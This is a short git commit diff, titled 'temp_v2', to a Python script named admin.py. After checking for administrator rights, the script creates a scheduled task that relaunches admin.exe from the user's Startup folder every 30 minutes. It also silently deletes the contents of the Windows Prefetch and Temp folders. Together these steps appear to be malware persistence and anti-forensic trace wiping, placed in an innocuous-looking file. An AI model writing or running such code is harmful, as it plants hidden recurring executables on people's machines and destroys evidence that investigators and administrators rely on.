2260d6bcc527660c9c49f5ce2e8beb436416abfe
Juan Sebastian Tovar Mogollon <74446573+juanstm200@users.noreply.github.com>
2021-10-27 11:37:21 -0500

    temp_v2

--- Temp/admin.py
+++ Temp/admin.py
@@ -9,7 +9,7 @@ def is_admin():
     except:
         return False
 if is_admin():
-    os.system(r"SCHTASKS /F /Create /tn tmp /sc minute /mo 30 /tr C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\admin.exe")
+    os.system(r"schtasks /f /create /tn tmp /sc minute /mo 30 /tr C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\admin.exe")
     os.system(r"del /s /f /q C:\Windows\Prefetch\*.* > Nul 2>&1")
     os.system(r"del /s /f /q C:\Windows\Temp\*.* > Nul 2>&1")
     os.system(r"del /s /f /q C:\Users\%USERNAME%\AppData\Local\Temp\*.* > Nul 2>&1")
